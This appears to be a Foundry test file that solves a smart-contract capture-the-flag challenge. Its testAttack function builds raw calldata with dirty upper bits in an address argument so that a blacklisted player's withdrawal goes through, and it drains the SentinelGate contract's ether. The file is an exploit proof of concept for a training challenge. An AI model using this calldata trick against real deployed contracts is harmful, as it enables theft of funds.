// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {Challenge} from "src/blackout/Challenge.sol";
import {SentinelGate} from "src/blackout/SentinelGate.sol";
import {ISentinelGate} from "src/blackout/interfaces/ISentinelGate.sol";

contract SolveTest is Test {
    uint256 internal constant INITIAL_DEPOSIT = 100 ether;

    Challenge internal challenge;
    SentinelGate internal gate;

    address internal deployer;
    address internal player;
    address internal attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        attacker = makeAddr("attacker");

        vm.deal(deployer, INITIAL_DEPOSIT);

        vm.prank(deployer);
        challenge = new Challenge{value: INITIAL_DEPOSIT}(player);
        gate = challenge.GATE();
    }

    function testAttack() public {
        assertEq(gate.balances(player), INITIAL_DEPOSIT);
        assertTrue(gate.blacklisted(player));

        bytes32 dirtyPlayer = bytes32((uint256(1) << 160) | uint160(player));

        vm.prank(attacker);
        (bool ok,) = address(gate).call(
            abi.encodePacked(ISentinelGate.withdrawAll.selector, dirtyPlayer)
        );

        assertTrue(ok, "exploit failed");
        assertEq(gate.balances(player), 0);
        assertEq(address(gate).balance, 0);
        assertEq(player.balance, INITIAL_DEPOSIT);
        assertTrue(challenge.isSolved());
    }
}
